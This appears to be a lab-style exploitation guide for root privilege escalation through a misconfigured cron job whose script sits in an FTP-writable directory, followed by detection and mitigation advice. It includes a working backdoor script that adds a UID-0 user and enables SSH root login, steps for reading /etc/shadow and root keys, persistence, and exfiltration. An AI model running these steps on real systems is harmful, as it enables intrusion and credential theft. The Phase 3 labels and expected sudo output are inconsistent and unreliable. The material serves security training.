# Exploitation Guide - vsftpd Privilege Escalation via Cron Misconfiguration

## Table of Contents
1. [Vulnerability Overview](#vulnerability-overview)
2. [Attack Prerequisites](#attack-prerequisites)
3. [Exploitation Steps](#exploitation-steps)
4. [Post-Exploitation](#post-exploitation)
5. [Detection Methods](#detection-methods)
6. [Mitigation Strategies](#mitigation-strategies)

## Vulnerability Overview

### Vulnerability Type
**Privilege Escalation via Cron Job Misconfiguration**

### Technical Details
- **Affected Component**: Root cron job executing script from user-writable directory
- **Attack Vector**: Replace benign script with malicious code via FTP access
- **Impact**: Complete root-level system compromise
- **CVSS Score**: 8.8 (High)
- **Required Access**: Valid FTP credentials (low-privilege user)

### How It Works

1. System has a cron job running as root
2. Cron job executes `/home/ftpuser/scripts/backup.sh`
3. The `scripts` directory is owned by `ftpuser`
4. Attacker logs in via FTP as `ftpuser`
5. Attacker replaces `backup.sh` with malicious script
6. Within 5 minutes, cron executes the malicious script as root
7. Attacker gains root privileges

### Real-World Relevance

This vulnerability pattern is common in:
- Automated backup systems
- Log rotation scripts
- Monitoring scripts
- CI/CD pipelines
- Application deployment scripts

Many administrators mistakenly place automation scripts in user-accessible directories, assuming "only automated systems" will access them.

## Attack Prerequisites

### Required Tools
- FTP client (command-line `ftp`, FileZilla, or WinSCP)
- Text editor or command-line tools
- Basic Linux knowledge
- Patience (up to 5 minutes for cron to execute)

### Required Access
- Valid FTP credentials for `ftpuser`
  - Username: `ftpuser`
  - Password: `ftppass123`
- Network access to target on port 21 (FTP)

## Exploitation Steps

### Phase 1: Reconnaissance

#### Step 1.1: Verify FTP Access
```bash
# Test FTP connection
ftp <target-ip>

# Login with credentials
Name: ftpuser
Password: ftppass123

# List files
ftp> ls

# Expected output:
# drwxr-xr-x 2 ftpuser ftpuser 4096 Feb  5 10:00 scripts

ftp> cd scripts
ftp> ls

# Should see backup.sh
# -rwxr-xr-x 1 ftpuser ftpuser  267 Feb  5 10:00 backup.sh
```

**ðŸ“¸ Screenshot 1**: Save as `screenshots/exploitation/01_ftp_connection.png`

#### Step 1.2: Download and Examine Current Script
```bash
# Still in FTP session
ftp> get backup.sh
ftp> quit

# Examine the script
cat backup.sh
```

**ðŸ“¸ Screenshot 2**: Save as `screenshots/exploitation/02_retrieve_original_script.png`
**ðŸ“¸ Screenshot 3**: Save as `screenshots/exploitation/03_read_backup.sh_.png`

#### Step 1.3: Identify the Vulnerability

Look for indicators:
- Script is owned by ftpuser
- Directory is writable by ftpuser
- Check if there are any cron jobs (requires shell access or educated guess)
```bash
# If you have SSH access to enumerate (optional)
ssh ftpuser@<target-ip>
sudo -l  # Will likely fail
ls -la /home/ftpuser/scripts/
cat /var/log/backup.log  # Check if script is being executed
exit
```

**Key Observation**: The backup.log shows the script runs automatically!

**ðŸ“¸ Screenshot 4**: Save as `screenshots/exploitation/04_vulnerability_identified.png`

### Phase 2: Exploitation

#### Step 2.1: Create Malicious Script

Create a malicious replacement script. Example:
```bash
#!/bin/bash
#Malicious script - creates attacker root user and enables SSH

# Execute original functionality 
echo "[$(date)] Backup script executed" >> /var/log/backup.log
echo "[$(date)] System uptime: $(uptime)" >> /var/log/backup.log

#Create backdoor user with UID 0 (root privileges)
if ! id attacker &> /dev/null; then
        useradd -m -s /bin/bash -o -u 0 -g 0 attacker
        echo "attacker:attacker" | chpasswd
        echo "[$(date)] Backdoor user created with root privileges" >> /var/log/backup.log
fi

#Enable root login via SSH (modify ssh config)
if ! grep -q "^PermitRootLogin yes" /etc/ssh/sshd_config; then
        #Backup original config
        cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

        #Enable root login
        sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config

        #Also ensure password authentication is enabled
        sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config

        #Restart SSH service
        systemctl reload sshd 2>/dev/null || systemctl reload ssh 2>/dev/null

        echo "[$(date)] SSH configured to allow root login" >> /var/log/backup.log
fi
```

#### Step 2.2: Upload Malicious Script
```bash
# Start FTP session
ftp <target-ip>
Name: ftpuser
Password: ftppass123

# Navigate to scripts directory
ftp> cd scripts

# Upload malicious script
ftp> put backup.sh

# Quit
ftp> quit
```

**ðŸ“¸ Screenshot 5**: Save as `screenshots/exploitation/05_malicious_upload.png`

#### Step 2.3: Wait for Cron Execution

The cron job runs every 5 minutes, so maximum wait time is 5 minutes.
```bash
# Monitor the backup log (if you have SSH access)
ssh ftpuser@<target-ip>
tail -f /var/log/backup.log

# Watch for new entries indicating execution
```

**ðŸ“¸ Screenshot 6**: Save as `screenshots/exploitation/06_waiting_cron.png`

### Phase 3: SSH into attacker user

#### Step 3.1: Test Sudo Access
```bash
# SSH as ftpuser
ssh attacker@<target-ip>

# Test sudo access
sudo -l

# Expected output:
# User attacker may run the following commands on target:
#     (ALL) NOPASSWD: ALL
```

**ðŸ“¸ Screenshot 7**: Save as `screenshots/exploitation/07_sudo_access.png`

## Post-Exploitation

### What Can You Do as Root?

#### Read Sensitive Files
```bash
# Read shadow file
cat /etc/shadow

# Read SSH private keys
cat /root/.ssh/id_rsa

# Read application configs
cat /etc/mysql/my.cnf
```
**ðŸ“¸ Screenshot 8**: Save as `screenshots/exploitation/08_post_exploitation.png`

#### Other Options:
### 1. Create Persistence
```bash
# Add backdoor user
useradd -m -s /bin/bash -G sudo backdoor
echo "backdoor:password123" | chpasswd

# Add SSH key for root
mkdir -p /root/.ssh
echo "your_ssh_public_key" >> /root/.ssh/authorized_keys
```

### 2. Lateral Movement
```bash
# Scan internal network
apt install nmap -y
nmap -sn 192.168.1.0/24

# Pivot to other systems
ssh other_internal_system
```

### 3. Data Exfiltration
```bash
# Compress sensitive data
tar -czf /tmp/exfil.tar.gz /etc /var/www /home

# Transfer via FTP (from another session)
# or via netcat, scp, etc.
```

## Detection Methods

### Blue Team Perspective

#### 1. File Integrity Monitoring

Monitor `/home/ftpuser/scripts/backup.sh` for changes:
```bash
# Install AIDE or Tripwire
apt install aide -y
aideinit
aide --check
```

#### 2. Cron Job Monitoring
```bash
# Monitor cron execution
tail -f /var/log/syslog | grep CRON

# Alert on unexpected changes to crontab
auditctl -w /var/spool/cron/crontabs -p wa -k cron_changes
```

#### 3. FTP Activity Monitoring
```bash
# Monitor vsftpd logs
tail -f /var/log/vsftpd.log

# Look for PUT commands to scripts directory
grep "scripts" /var/log/vsftpd.log | grep "UPLOAD"
```

#### 4. Privilege Escalation Detection
```bash
# Monitor sudo usage
tail -f /var/log/auth.log | grep sudo

# Alert on new sudo users
auditctl -w /etc/sudoers -p wa -k sudoers_changes
```

#### 5. Process Monitoring
```bash
# Look for unusual processes spawned by cron
ps aux | grep cron

# Monitor for reverse shells
netstat -antp | grep ESTABLISHED
```

### Indicators of Compromise (IOCs)

- Unexpected modifications to `/home/ftpuser/scripts/backup.sh`
- FTP PUT commands to scripts directory
- New entries in `/etc/sudoers.d/`
- new user added to sudo group
- Unusual outbound network connections from cron jobs

## Mitigation Strategies

### Immediate Remediation

1. **Remove the Vulnerability**
```bash
   # Move script to root-only directory
   sudo mkdir -p /opt/scripts
   sudo mv /home/ftpuser/scripts/backup.sh /opt/scripts/
   sudo chown root:root /opt/scripts/backup.sh
   sudo chmod 700 /opt/scripts/backup.sh
   
   # Update cron job
   sudo crontab -e
   # Change to: */5 * * * * /opt/scripts/backup.sh >> /var/log/backup.log 2>&1
```

2. **Restrict FTP Access**
```bash
   # Disable write access if not needed
   sudo nano /etc/vsftpd.conf
   # Set: write_enable=NO
   
   # Or restrict to specific directories
   # Set: chroot_local_user=YES
```

### Long-Term Security Improvements

#### 1. Principle of Least Privilege

- Never run scripts from user-writable directories as root
- Use dedicated service accounts with minimal permissions
- Implement proper file permissions (owner: root, permissions: 700)

#### 2. File Integrity Monitoring
```bash
# Implement AIDE
apt install aide
aideinit
cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Add to cron
echo "0 5 * * * /usr/bin/aide --check" | sudo crontab -
```

#### 3. Audit Logging
```bash
# Enable auditd
apt install auditd
systemctl enable auditd
systemctl start auditd

# Add rules for sensitive files
auditctl -w /etc/sudoers -p wa -k sudoers_changes
auditctl -w /etc/shadow -p wa -k shadow_changes
```

#### 4. Secure Cron Jobs

Best practices:
- Store scripts in `/opt/scripts` or `/usr/local/bin`
- Set ownership to `root:root`
- Set permissions to `700` or `750`
- Use absolute paths in cron jobs
- Validate script integrity before execution

#### 5. FTP Security
```bash
# Consider disabling FTP entirely
sudo systemctl disable vsftpd
sudo systemctl stop vsftpd

# Use SFTP instead
# SFTP uses SSH and is more secure

# If FTP is required:
# - Use FTPS (FTP over TLS)
# - Implement chroot jails
# - Use strong passwords or key-based auth
# - Restrict write access
```

## Conclusion

This vulnerability demonstrates how a simple misconfiguration in automation can lead to complete system compromise. The key lessons:

1. **Never** execute root-privileged scripts from user-writable locations
2. Implement proper file permissions and ownership
3. Monitor and audit critical system files
4. Use principle of least privilege
5. Prefer SFTP over FTP for file transfers

### Additional Resources

- OWASP: [Insecure File Permissions](https://owasp.org/www-community/vulnerabilities/Insecure_Transport)
- CIS Benchmarks: Linux Security
- NIST: Principle of Least Privilege
- Linux Security Hardening Guide

---

**Remember**: This exploitation guide is for educational purposes only. Always obtain proper authorization before testing systems you don't own.
